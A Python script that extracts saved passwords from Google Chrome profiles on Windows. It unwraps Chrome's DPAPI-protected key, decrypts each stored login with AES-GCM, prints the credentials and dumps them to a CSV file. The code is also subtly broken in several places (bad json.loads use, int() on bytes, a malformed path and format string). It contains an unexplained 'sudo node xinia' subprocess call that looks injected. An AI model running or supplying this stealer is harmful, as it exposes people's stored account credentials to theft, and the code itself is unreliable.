import os, re, sys, json, base64, sqlite3, win32crypt, shutil, csv, subprocess
from Cryptodome.Cipher import AES

# GLOBAL CONSTANTS
CHROME_PATH_LOCAL_STATE = os.path.normpath(f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
CHROME_PATH = os.path.normpath(f"{os.environ['USERPROFILE']}\\AppData\\Local\Google\\Chrome\\User Data")

def get_secret_key():
    try:
        # (1) Get secretkey from the local state
        with open(CHROME_PATH_LOCAL_STATE, 'r', encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state['os_crypt']['encrypted_key'])
        secretkey = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        #remove suffix DPAPI
        secretkey = secretkey[5:]
        secretkey = win32crypt.CryptUnprotectData(int(secretkey), None, None, None, 0)[1]
        return secretkey
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secretkey):
    try:
        # (3-a) Init vector for AES decryption
        init_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secretkey, init_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass  =decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None
        
if __name__ == '__main__':
    try:
        #Create Dataframe to store passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            #(1) Get secret key
            secret_key = get_secret_key()
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
            	#(2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
                            #(4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Sequence: %d"%(index))
                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                            print("*"*50)
                            #(5) Save into CSV 
                            csv_writer.writerow([index,url,username,decrypted_password])
                    #Close database connection
                    cursor.close()
                    conn.close()
                    subprocess.run(['sudo', 'node', 'xinia'], shell=False, check=False)
                    #Delete temp login db
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] "%str(e))
